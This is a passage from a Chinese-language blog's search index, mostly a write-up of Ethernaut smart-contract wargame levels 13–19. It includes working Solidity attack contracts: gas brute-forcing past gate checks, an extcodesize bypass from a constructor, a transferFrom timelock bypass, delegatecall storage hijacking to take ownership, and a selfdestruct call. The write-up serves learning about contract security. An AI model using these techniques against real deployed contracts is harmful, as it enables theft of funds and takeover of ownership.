<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>博客正在进行迁移，敬请期待</title>
      <link href="/2022/11/02/2019-11-01-Hexo-Theme-Snail/"/>
      <url>/2022/11/02/2019-11-01-Hexo-Theme-Snail/</url>
      
        <content type="html"><![CDATA[<h1 id="迁移公告"><a href="#迁移公告" class="headerlink" title="迁移公告"></a>迁移公告</h1><p>博客正在迁移，感兴趣的朋友可以去<a href="https://thomasxu-blockchain.github.io/Conract_Attack/" target="_blank" rel="noopener">老博客地址</a></p><blockquote><p>博客还未迁移完成，</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> chain-sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 敬请期待 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 13-19</title>
      <link href="/2022/06/26/2022-11-03-ethernaut03/"/>
      <url>/2022/06/26/2022-11-03-ethernaut03/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-13-19"><a href="#Ethernaut靶场刷题记录-13-19" class="headerlink" title="Ethernaut靶场刷题记录(13-19)"></a>Ethernaut靶场刷题记录(13-19)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13 Gatekeeper One"></a>13 Gatekeeper One</h2><p>这关主要是考查对solidity合约基础知识的了解。<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) !&#x3D; uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目想要我们执行enter方法，并且要通过三个修饰器的检查。<br/><br>我们把三个修饰器分开来分析：</p><ul><li>require(msg.sender != tx.origin);<br>这个条件我们再之前做题的时候遇到过，只需要再调用函数时增加一个中间函数，就可以使<code>msg.sender != tx.origin</code></li><li>require(gasleft().mod(8191) == 0);这个条件会比较麻烦一点，gasleft函数返回的是交易剩余的gas量，所以我们只要让gas为8191*n+x即可，其中x为我们此次交易所消耗的gas。理论上来讲可以通过debug得到，但是由于不知道目标合约的编译器版本，所以无法精准得到这个值。但我们可以通过gas爆破来解决。毕竟gas毕竟是在一个范围区间之中的。</li><li><p>require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));<br>require(uint32(uint64(_gateKey)) != uint64(_gateKey));<br>require(uint32(uint64(_gateKey)) == uint16(tx.origin));<br>这个条件要求我们先了解solidity中类型转换的规则<a href="https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256." target="_blank" rel="noopener">参考链接</a><br/><br>这里以_gateKey是0x12345678deadbeef为例说明</p><blockquote><ol><li>uint32(uint64(_gateKey))转换后会取低位，所以变成0xdeadbeef，uint16(uint64(_gateKey))同理会变成0xbeef，uint16和uint32在比较的时候，较小的类型uint16会在左边填充0，也就是会变成0x0000beef和0xdeadbeef做比较，因此想通过第一个require只需要找一个形为0x????????0000????这种形式的值即可，其中?是任取值。</li><li>第二步要求双方不相等，只需高4个字节中任有一个bit不为0即可</li><li>通过前面可知，uint32(uint64(_gateKey))应该是类似0x0000beef这种形式，所以只需要让最低的2个byte和tx.origin地址最低的2个byte相同即可，也就是，key的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址</li></ol></blockquote><p>攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function entrant() external returns (address);</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    GatekeeperOne gatekeeperOne;</span><br><span class="line">    address target;</span><br><span class="line">    address entrant;</span><br><span class="line"></span><br><span class="line">    event log(bool);</span><br><span class="line">    event logaddr(address);</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        &#x2F;&#x2F; 设置为题目地址</span><br><span class="line">        target &#x3D; _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        &#x2F;&#x2F; 后四位是metamask上账户地址的低2个字节</span><br><span class="line">        bytes8 key&#x3D;0xAAAAAAAA0000Ff67;</span><br><span class="line">        bool result;</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 120; i++) &#123;&#x2F;&#x2F;gas爆破</span><br><span class="line">            (bool result, bytes memory data) &#x3D; address(target).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        emit log(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getentrant() public &#123;</span><br><span class="line">        gatekeeperOne &#x3D; GatekeeperOne(target);</span><br><span class="line">        entrant &#x3D; gatekeeperOne.entrant();</span><br><span class="line">        emit logaddr(entrant);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>解题步骤<br>执行exploit方法后执行getentrant,可以在交易详细中看到提交上来的事务中address已经为我们的地址。通关</p></li></ul><h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>在做了第一道守门人后，这道题目看起来就easy很多了<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x :&#x3D; extcodesize(caller()) &#125;</span><br><span class="line">    require(x &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) &#x3D;&#x3D; uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>一样的有三个函数修饰器需要满足，我们依旧分开来说</p><ul><li><strong>require(msg.sender != tx.origin);</strong><br>这个和上一个的第一个条件一样，不再赘述，建一个合约就行。</li><li><p><strong>uint x</strong><br><strong>assembly { x := extcodesize(caller()) }</strong><br><strong>require(x == 0);</strong><br>这里涉及到了solidity中的汇编语言，<a href="https://solidity-cn.readthedocs.io/zh/develop/assembly.html#" target="_blank" rel="noopener">参考文档</a>，在这里<code>caller</code>是调用的发起者，<code>extcodesize(a)</code>会返回地址 a 的代码大小。<br>关于这点，需要使用一个特性绕过：当合约正在执行构造函数constructor并部署时，其extcodesize为0。换句话说，如果我们在constructor中调用这个函数的话，那么extcodesize(caller())返回0，因此可以绕过检查。</p></li><li><p><strong>require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</strong><br>这个条件其实就是一个简单的异或，我们只需要反过来异或一次算出来的结果就是key<br/></p></li></ul><p>攻击合约:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    address target;</span><br><span class="line">    constructor(address _adr) public&#123;</span><br><span class="line">        target &#x3D; _adr;</span><br><span class="line">        bytes8 password &#x3D; bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1);</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,password));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15 Naught Coin"></a>15 Naught Coin</h2><p>这关考查对ERC20的了解<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;openzeppelin-contracts&#x2F;blob&#x2F;release-v3.2.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; string public constant name &#x3D; &#39;NaughtCoin&#39;;</span><br><span class="line">  &#x2F;&#x2F; string public constant symbol &#x3D; &#39;0x0&#39;;</span><br><span class="line">  &#x2F;&#x2F; uint public constant decimals &#x3D; 18;</span><br><span class="line">  uint public timeLock &#x3D; now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) public &#123;</span><br><span class="line">    player &#x3D; _player;</span><br><span class="line">    INITIAL_SUPPLY &#x3D; 1000000 * (10**uint256(decimals()));</span><br><span class="line">    &#x2F;&#x2F; _totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    &#x2F;&#x2F; _balances[player] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender &#x3D;&#x3D; player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>光看这个函数修饰器是没有漏洞可言的，但问题是，ERC20有两个转账函数，题目中只对<code>transfer</code>这一个函数做了修饰，也就是说，我们可以使用另一个函数进行转账-<code>transferFrom</code></p><ul><li>解题步骤<br>直接在控制台操作即可，但要注意，在转账操作之前我们需要先approve<br>val=’1000000000000000000000000’<br>addr=’0x5B38Da6a701c568545dCfcB03FcB875f56beddC4’<ol><li>contract.approve(player,val)</li><li>contract.transferFrom(player,addr,val)</li></ol></li></ul><h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16 Preservation"></a>16 Preservation</h2><p>这关是对delegatecall漏洞的考查，大家可以看我对delegatecall的另一篇文章<a href="../Delegatecall.html">delegatecall杂谈</a><br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  &#x2F;&#x2F; Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature &#x3D; bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library &#x3D; _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library &#x3D; _timeZone2LibraryAddress; </span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime &#x3D; _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>由于delegatecall的执行环境是当前合约，所以如果要调用的函数内有修改变量的操作，将会导致自身的<strong>对应储存位上</strong>的变量被恶意修改，具体可以参考我的另一篇博客。<br/><br>利用这一点，我们可以实现攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function setTime(uint _time) public &#123;</span><br><span class="line">        owner &#x3D; address(_time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>由于在perservation里，owner是在第2个存储位，所以我们这里需要两个变量来”占位”,这样就可以做到恶意修改被攻击合约的owner的目的。</p><ul><li>解题步骤</li></ul><ol><li>执行<code>setFirstTime</code>函数，将我们的攻击合约地址作为参数传进去，可以看到此时timeZone1Library已经变为我们攻击合约的地址。<br><img src="../images/ethernaut/e16/1.jpg" alt=""><br><img src="../images/ethernaut/e16/2.jpg" alt=""></li><li>再次执行<code>setFirstTime</code>，此时调用的就是我们的攻击合约了，我们只需要把我们自己的地址作为参数传进去，就可以完成攻击。</li></ol><h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17 Recovery"></a>17 Recovery</h2><p>这关考查对区块链浏览器的使用和destroy函数<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts-ethereum-package&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  &#x2F;&#x2F; public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name &#x3D; _name;</span><br><span class="line">    balances[_creator] &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;&#x3D; _amount);</span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] &#x3D; _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目中给到了一个合约地址，是<code>Recovery</code>的地址，题目中说创建者通过Recovery创建了一个SimpleToken，然后把地址给忘了，要我们找到这个地址并且把里面的钱弄出来。很容易，通过区块链浏览器就可以找到他创建的<code>SimpleToken</code>。<br/><br>在 <a href="https://rinkeby.etherscan.io/" target="_blank" rel="noopener">https://rinkeby.etherscan.io/</a> 上搜索Recovery的地址，然后我们就可以看到他的创建合约交易，点进去就可以找到合约地址。<br><img src="../images/ethernaut/e17/1.jpg" alt=""><br>得到地址后，我们只需要执行合约的自毁函数即可<br/><br>攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    address payable target;</span><br><span class="line">    address payable owner;</span><br><span class="line">    constructor(address payable _target, address payable _own) public&#123;</span><br><span class="line">        target &#x3D; _target;</span><br><span class="line">        owner &#x3D; _own;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dosome() public &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;destroy(address)&quot;,owner));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>在执行dosome()方法的时候最好把交易的gaslimit调高一点，我在执行时如果不调gaslimit是会执行失败的，如图：<br><img src="../images/ethernaut/e17/2.jpg" alt=""></p></blockquote><h2 id="18-Magic-Number"><a href="#18-Magic-Number" class="headerlink" title="18 Magic Number"></a>18 Magic Number</h2><p>这是一个考察solidity操作码的题目<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver &#x3D; _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        </span><br><span class="line">     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       </span><br><span class="line">      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      </span><br><span class="line">       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     </span><br><span class="line">        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    </span><br><span class="line">         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   </span><br><span class="line">          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  </span><br><span class="line">           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42。<br>因此我们必须使用字节码手动编写一个程序</p><h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 Alien Codex"></a>19 Alien Codex</h2><p>又是一道关于内存布局的题目</p>]]></content>
      
      
      <categories>
          
          <category> ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 07-12</title>
      <link href="/2022/06/24/ethernaut02/"/>
      <url>/2022/06/24/ethernaut02/</url>
      
